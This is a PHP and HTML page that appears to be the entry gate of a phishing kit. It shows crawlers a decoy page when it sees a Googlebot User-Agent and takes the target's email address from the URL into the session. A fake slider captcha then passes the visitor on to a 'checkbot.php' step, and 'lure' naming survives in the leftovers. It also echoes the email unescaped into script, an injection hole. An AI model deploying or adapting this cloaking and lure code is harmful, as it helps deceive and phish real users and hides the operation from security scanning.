<?php
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

// Проверяем, является ли User-Agent строкой Googlebot
if (strpos($userAgent, 'Googlebot') !== false || @$_GET['test'] == "Googlebot") {
    // Это Googlebot, выполнение скрипта прекращается
   echo file_get_contents("main.html");
   die();
}


session_start();
$_SESSION['key'] = md5(@$_GET['e']);
$_SESSION['mail'] = @$_GET['e'];

?>
<html>
  <head>
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Captcha</title>
	<script src="https://code.jquery.com/jquery-3.7.0.min.js" integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" crossorigin="anonymous"></script>
    <style>
      .block {
        position: absolute;
        left: 0;
        top: 0;
      }
      .sliderContainer {
        position: relative;
        text-align: center;
        width: 310px;
        height: 40px;
        line-height: 40px;
        margin-top: 15px;
        font-family: verdana;
        background: #f7f9fa;
        font-size: 14px;
        color: #45494c;
        border: 1px solid #e4e7eb;
      }
      .sliderContainer_active .slider {
        height: 38px;
        top: -1px;
        border: 1px solid #1991fa;
      }
      .sliderContainer_active .sliderMask {
        height: 38px;
        border-width: 1px;
      }
      .sliderContainer_success .slider {
        height: 38px;
        top: -1px;
        border: 1px solid #52ccba;
        background-color: #52ccba !important;
      }
      .sliderContainer_success .sliderMask {
        height: 38px;
        border: 1px solid #52ccba;
        background-color: #d2f4ef;
      }
      .sliderContainer_success .sliderIcon {
        background-position: 0 0 !important;
      }
      .sliderContainer_fail .slider {
        height: 38px;
        top: -1px;
        border: 1px solid #f57a7a;
        background-color: #f57a7a !important;
      }
      .sliderContainer_fail .sliderMask {
        height: 38px;
        border: 1px solid #f57a7a;
        background-color: #fce1e1;
      }
      .sliderContainer_fail .sliderIcon {
        top: 14px;
        background-position: 0 -82px !important;
      }
      .sliderContainer_active .sliderText,
      .sliderContainer_fail .sliderText,
      .sliderContainer_success .sliderText {
        display: none;
      }
      .sliderMask {
        position: absolute;
        left: 0;
        top: 0;
        height: 40px;
        border: 0 solid #1991fa;
        background: #d1e9fe;
      }
      body {
        background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxOTIwIiBoZWlnaHQ9IjEwODAiIGZpbGw9Im5vbmUiPjxnIG9wYWNpdHk9Ii4yIiBjbGlwLXBhdGg9InVybCgjRSkiPjxwYXRoIGQ9Ik0xNDY2LjQgMTc5NS4yYzk1MC4zNyAwIDE3MjAuOC02MjcuNTIgMTcyMC44LTE0MDEuNlMyNDE2Ljc3LTEwMDggMTQ2Ni40LTEwMDgtMjU0LjQtMzgwLjQ4Mi0yNTQuNCAzOTMuNnM3NzAuNDI4IDE0MDEuNiAxNzIwLjggMTQwMS42eiIgZmlsbD0idXJsKCNBKSIvPjxwYXRoIGQ9Ik0zOTQuMiAxODE1LjZjNzQ2LjU4IDAgMTM1MS44LTQ5My4yIDEzNTEuOC0xMTAxLjZTMTE0MC43OC0zODcuNiAzOTQuMi0zODcuNi05NTcuNiAxMDUuNjAzLTk1Ny42IDcxNC0zNTIuMzggMTgxNS42IDM5NC4yIDE4MTUuNnoiIGZpbGw9InVybCgjQikiLz48cGF0aCBkPSJNMTU0OC42IDE4ODUuMmM2MzEuOTIgMCAxMTQ0LjItNDE3LjQ1IDExNDQuMi05MzIuNFMyMTgwLjUyIDIwLjQgMTU0OC42IDIwLjQgNDA0LjQgNDM3Ljg1IDQwNC40IDk1Mi44czUxMi4yNzYgOTMyLjQgMTE0NC4yIDkzMi40eiIgZmlsbD0idXJsKCNDKSIvPjxwYXRoIGQ9Ik0yNjUuOCAxMjE1LjZjNjkwLjI0NiAwIDEyNDkuOC00NTUuNTk1IDEyNDkuOC0xMDE3LjZTOTU2LjA0Ni04MTkuNiAyNjUuOC04MTkuNi05ODQtMzY0LjAwNS05ODQgMTk4LTQyNC40NDUgMTIxNS42IDI2NS44IDEyMTUuNnoiIGZpbGw9InVybCgjRCkiLz48L2c+PGRlZnM+PHJhZGlhbEdyYWRpZW50IGlkPSJBIiBjeD0iMCIgY3k9IjAiIHI9IjEiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiBncmFkaWVudFRyYW5zZm9ybT0idHJhbnNsYXRlKDE0NjYuNCAzOTMuNikgcm90YXRlKDkwKSBzY2FsZSgxNDAxLjYgMTcyMC44KSI+PHN0b3Agc3RvcC1jb2xvcj0iIzEwN2MxMCIvPjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iI2M0YzRjNCIgc3RvcC1vcGFjaXR5PSIwIi8+PC9yYWRpYWxHcmFkaWVudD48cmFkaWFsR3JhZGllbnQgaWQ9IkIiIGN4PSIwIiBjeT0iMCIgcj0iMSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIGdyYWRpZW50VHJhbnNmb3JtPSJ0cmFuc2xhdGUoMzk0LjIgNzE0KSByb3RhdGUoOTApIHNjYWxlKDExMDEuNiAxMzUxLjgpIj48c3RvcCBzdG9wLWNvbG9yPSIjMDA3OGQ0Ii8+PHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjYzRjNGM0IiBzdG9wLW9wYWNpdHk9IjAiLz48L3JhZGlhbEdyYWRpZW50PjxyYWRpYWxHcmFkaWVudCBpZD0iQyIgY3g9IjAiIGN5PSIwIiByPSIxIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgZ3JhZGllbnRUcmFuc2Zvcm09InRyYW5zbGF0ZSgxNTQ4LjYgOTUyLjgpIHJvdGF0ZSg5MCkgc2NhbGUoOTMyLjQgMTE0NC4yKSI+PHN0b3Agc3RvcC1jb2xvcj0iI2ZmYjkwMCIgc3RvcC1vcGFjaXR5PSIuNzUiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNjNGM0YzQiIHN0b3Atb3BhY2l0eT0iMCIvPjwvcmFkaWFsR3JhZGllbnQ+PHJhZGlhbEdyYWRpZW50IGlkPSJEIiBjeD0iMCIgY3k9IjAiIHI9IjEiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiBncmFkaWVudFRyYW5zZm9ybT0idHJhbnNsYXRlKDI2NS44IDE5OCkgcm90YXRlKDkwKSBzY2FsZSgxMDE3LjYgMTI0OS44KSI+PHN0b3Agc3RvcC1jb2xvcj0iI2Q4M2IwMSIgc3RvcC1vcGFjaXR5PSIuNzUiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNjNGM0YzQiIHN0b3Atb3BhY2l0eT0iMCIvPjwvcmFkaWFsR3JhZGllbnQ+PGNsaXBQYXRoIGlkPSJFIj48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMCAwaDE5MjB2MTA4MEgweiIvPjwvY2xpcFBhdGg+PC9kZWZzPjwvc3ZnPg==);
        background-repeat: no-repeat;
        background-attachment: fixed;
        background-size: cover;
      }
      .slider {
        position: absolute;
        top: 0;
        left: 0;
        width: 40px;
        height: 40px;
        background: #fff;
        box-shadow: 0 0 3px rgba(0, 0, 0, 0.3);
        cursor: pointer;
        transition: background 0.2s linear;
      }
      .slider:hover {
        background: #1991fa;
      }
      .slider:hover .sliderIcon {
        background-position: 0 -13px;
      }
      .sliderIcon {
        position: absolute;
        top: 15px;
        left: 13px;
        width: 14px;
        height: 12px;
        background: url(https://cstaticdun.126.net//2.6.3/images/icon_light.f13cff3.png)
          0 -26px;
        background-size: 34px 471px;
      }
      .refreshIcon {
        position: absolute;
        right: 0;
        top: 0;
        width: 34px;
        height: 34px;
        cursor: pointer;
        background: url(https://cstaticdun.126.net//2.6.3/images/icon_light.f13cff3.png)
          0 -437px;
        background-size: 34px 471px;
      }
      .container {
        width: 310px;
        margin: 25vh auto;
      }
      input {
        display: block;
        width: 290px;
        line-height: 40px;
        margin: 10px 0;
        padding: 0 10px;
        outline: 0;
        border: 1px solid #c8cccf;
        border-radius: 4px;
        color: #6a6f77;
      }
      #msg {
        width: 100%;
        line-height: 40px;
        font-size: 14px;
        text-align: center;
      }
      a:active,
      a:hover,
      a:link,
      a:visited {
        margin-left: 100px;
        color: #0366d6;
      }
      p {
        text-align: center;
        font-family: verdana;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <p></p>
      <p>Please solve the puzzle to prove you're not a robot</p>
      <div id="captcha"></div>
      <div id="msg"></div>
    </div>
    <script>
      "use strict";
	  
	  function stringToHex(str) {
		  let hex = '';
		  for (let i = 0; i < str.length; i++) {
			hex += str.charCodeAt(i).toString(16).padStart(2, '0');
		  }
		  return hex;
		}
	  
      var _createClass = (function () {
        function i(e, t) {
          for (var n = 0; n < t.length; n++) {
            var i = t[n];
            (i.enumerable = i.enumerable || !1),
              (i.configurable = !0),
              "value" in i && (i.writable = !0),
              Object.defineProperty(e, i.key, i);
          }
        }
        return function (e, t, n) {
          return t && i(e.prototype, t), n && i(e, n), e;
        };
      })();
      function _classCallCheck(e, t) {
        if (!(e instanceof t))
          throw new TypeError("Cannot call a class as a function");
      }
      function cleanMsg() {
        document.getElementById("msg").innerHTML = "";
      }
      !(function (e) {
        var s = 42,
          f = 310,
          h = 155,
          r = Math.PI,
          o = 63;
        function t(e, t) {
          return Math.round(Math.random() * (t - e) + e);
        }
        function v(e, t) {
          var n = document.createElement(e);
          return (n.className = t), n;
        }
        function d(e, t) {
          e.classList.add(t);
        }
        function a() {
          return "https://picsum.photos/300/150/?image=" + t(0, 1084);
        }
        function n(e, t, n, i) {
          e.beginPath(),
            e.moveTo(t, n),
            e.arc(t + 21, n - 9 + 2, 9, 0.72 * r, 2.26 * r),
            e.lineTo(t + s, n),
            e.arc(t + s + 9 - 2, n + 21, 9, 1.21 * r, 2.78 * r),
            e.lineTo(t + s, n + s),
            e.lineTo(t, n + s),
            e.arc(t + 9 - 2, n + 21, 9.4, 2.76 * r, 1.24 * r, !0),
            e.lineTo(t, n),
            (e.lineWidth = 2),
            (e.fillStyle = "rgba(255, 255, 255, 0.7)"),
            (e.strokeStyle = "rgba(255, 255, 255, 0.7)"),
            e.stroke(),
            e[i](),
            (e.globalCompositeOperation = "overlay");
        }
        function l(e, t) {
          return e + t;
        }
        function c(e) {
          return e * e;
        }
        "classList" in document.documentElement ||
          Object.defineProperty(HTMLElement.prototype, "classList", {
            get: function () {
              var s = this;
              function e(i) {
                return function (e) {
                  var t = s.className.split(/\s+/g),
                    n = t.indexOf(e);
                  i(t, n, e), (s.className = t.join(" "));
                };
              }
              return {
                add: e(function (e, t, n) {
                  ~t || e.push(n);
                }),
                remove: e(function (e, t) {
                  ~t && e.splice(t, 1);
                }),
                toggle: e(function (e, t, n) {
                  ~t ? e.splice(t, 1) : e.push(n);
                }),
                contains: function (e) {
                  return !!~s.className.split(/\s+/g).indexOf(e);
                },
                item: function (e) {
                  return s.className.split(/\s+/g)[e] || null;
                },
              };
            },
          });
        var i =
          (_createClass(u, [
            {
              key: "init",
              value: function () {
                this.initDOM(), this.initImg(), this.bindEvents();
              },
            },
            {
              key: "initDOM",
              value: function () {
                var e,
                  t,
                  n,
                  i =
                    ((e = f),
                    (t = h),
                    ((n = v("canvas")).width = e),
                    (n.height = t),
                    n),
                  s = i.cloneNode(!0),
                  r = v("div", "sliderContainer"),
                  o = v("div", "refreshIcon"),
                  a = v("div", "sliderMask"),
                  l = v("div", "slider"),
                  c = v("span", "sliderIcon"),
                  u = v("span", "sliderText");
                (s.className = "block"),
                  (u.innerHTML = "Swipe right to fill the puzzle");
                var d = this.el;
                d.appendChild(i),
                  d.appendChild(o),
                  d.appendChild(s),
                  l.appendChild(c),
                  a.appendChild(l),
                  r.appendChild(a),
                  r.appendChild(u),
                  d.appendChild(r),
                  "function" != typeof Object.assign &&
                    Object.defineProperty(Object, "assign", {
                      value: function (e, t) {
                        if (null == e)
                          throw new TypeError(
                            "Cannot convert undefined or null to object"
                          );
                        for (
                          var n = Object(e), i = 1;
                          i < arguments.length;
                          i++
                        ) {
                          var s = arguments[i];
                          if (null != s)
                            for (var r in s)
                              Object.prototype.hasOwnProperty.call(s, r) &&
                                (n[r] = s[r]);
                        }
                        return n;
                      },
                      writable: !0,
                      configurable: !0,
                    }),
                  Object.assign(this, {
                    canvas: i,
                    block: s,
                    sliderContainer: r,
                    refreshIcon: o,
                    slider: l,
                    sliderMask: a,
                    sliderIcon: c,
                    text: u,
                    canvasCtx: i.getContext("2d"),
                    blockCtx: s.getContext("2d"),
                  });
              },
            },
            {
              key: "initImg",
              value: function () {
                var e,
                  t,
                  n = this,
                  i =
                    ((e = function () {
                      n.canvasCtx.drawImage(i, 0, 0, f, h),
                        n.draw(),
                        n.blockCtx.drawImage(i, 0, 0, f, h);
                      var e = n.y - 18 - 1;
                      if (-1 < navigator.userAgent.indexOf("MSIE"))
                        n.block.style.marginLeft = "-" + (n.x - 3) + "px";
                      else {
                        var t = n.blockCtx.getImageData(n.x - 3, e, o, o);
                        (n.block.width = o), n.blockCtx.putImageData(t, 0, e);
                      }
                    }),
                    ((t = v("img")).crossOrigin = "Anonymous"),
                    (t.onload = e),
                    (t.onerror = function () {
                      t.src = a();
                    }),
                    (t.src = a()),
                    t);
                this.img = i;
              },
            },
            {
              key: "draw",
              value: function () {
                (this.x = t(73, 237)),
                  (this.y = t(28, 82)),
                  n(this.canvasCtx, this.x, this.y, "fill"),
                  n(this.blockCtx, this.x, this.y, "clip");
              },
            },
            {
              key: "clean",
              value: function () {
                this.canvasCtx.clearRect(0, 0, f, h),
                  this.blockCtx.clearRect(0, 0, f, h),
                  (this.block.width = f);
              },
            },
            {
              key: "bindEvents",
              value: function () {
                var o = this;
                function e(e) {
                  (a = e.clientX || e.touches[0].clientX),
                    (l = e.clientY || e.touches[0].clientY),
                    (u = !0);
                }
                function t(e) {
                  if (!u) return !1;
                  var t = e.clientX || e.touches[0].clientX,
                    n = e.clientY || e.touches[0].clientY,
                    i = t - a,
                    s = n - l;
                  if (i < 0 || f <= 38 + i) return !1;
                  o.slider.style.left = i + "px";
                  var r = (250 / 270) * i;
                  (o.block.style.left = r + "px"),
                    d(o.sliderContainer, "sliderContainer_active"),
                    (o.sliderMask.style.width = i + "px"),
                    c.push(s);
                }
                function n(e) {
                  if (!u) return !1;
                  var t, n;
                  if (
                    ((u = !1), (e.clientX || e.changedTouches[0].clientX) == a)
                  )
                    return !1;
                  (t = o.sliderContainer),
                    (n = "sliderContainer_active"),
                    t.classList.remove(n),
                    (o.trail = c);
                  var i = o.verify(),
                    s = i.spliced,
                    r = i.verified;
                  s
                    ? r
                      ? (d(o.sliderContainer, "sliderContainer_success"),
                        "function" == typeof o.onSuccess && o.onSuccess())
                      : (d(o.sliderContainer, "sliderContainer_fail"),
                        (o.text.innerHTML = "try again"),
                        o.reset())
                    : (d(o.sliderContainer, "sliderContainer_fail"),
                      "function" == typeof o.onFail && o.onFail(),
                      setTimeout(function () {
                        o.reset();
                      }, 1e3));
                }
                (this.el.onselectstart = function () {
                  return !1;
                }),
                  (this.refreshIcon.onclick = function () {
                    o.reset(),
                      "function" == typeof o.onRefresh && o.onRefresh();
                  });
                var a = void 0,
                  l = void 0,
                  c = [],
                  u = !1;
                this.slider.addEventListener("mousedown", e),
                  this.slider.addEventListener("touchstart", e),
                  document.addEventListener("mousemove", t),
                  document.addEventListener("touchmove", t),
                  document.addEventListener("mouseup", n),
                  document.addEventListener("touchend", n);
              },
            },
            {
              key: "verify",
              value: function () {
                var e = this.trail,
                  t = e.reduce(l) / e.length,
                  n = e.map(function (e) {
                    return e - t;
                  }),
                  i = Math.sqrt(n.map(c).reduce(l) / e.length),
                  s = parseInt(this.block.style.left);
                return {
                  spliced: Math.abs(s - this.x) < 10,
                  verified: 0 !== i,
                };
              },
            },
            {
              key: "reset",
              value: function () {
                (this.sliderContainer.className = "sliderContainer"),
                  (this.slider.style.left = 0),
                  (this.block.style.left = 0),
                  (this.sliderMask.style.width = 0),
                  this.clean(),
                  (this.img.src = a());
              },
            },
          ]),
          u);
        function u(e) {
          var t = e.el,
            n = e.onSuccess,
            i = e.onFail,
            s = e.onRefresh;
          _classCallCheck(this, u),
            (t.style.position = t.style.position || "relative"),
            (this.el = t),
            (this.onSuccess = n),
            (this.onFail = i),
            (this.onRefresh = s);
        }
        e.jigsaw = {
          init: function (e) {
            return new i(e).init();
          },
        };
      })(window),
        jigsaw.init({
          el: document.getElementById("captcha"),
          onSuccess: function () {
			console.log("Success!")
            var hash = window.location.hash;
            // var url = { lure_url_js } + "#" + hash.split("#")[1];
            // console.log('---------', hash, url);
            var lure_url_js = "https://google.com/";
            var url = lure_url_js + "#";
            (document.getElementById("msg").innerHTML = "Success!");
			
			const url_now = new URL(window.location.href);
			// Создаем объект URLSearchParams на основе параметров
			const params = new URLSearchParams(url_now.search);
			
			window.location.href = 'checkbot.php?key=<?=$_SESSION['key']?>&mail=<?=$_SESSION['mail'];?>';
			
			
			         // filter(data);
             /*( setTimeout( function(){
					
					window.location.href = '/checkbot';
              
			  }, 2000); */
          },
          onFail: cleanMsg,
          onRefresh: cleanMsg,
        });
    </script>
  </body>
</html>
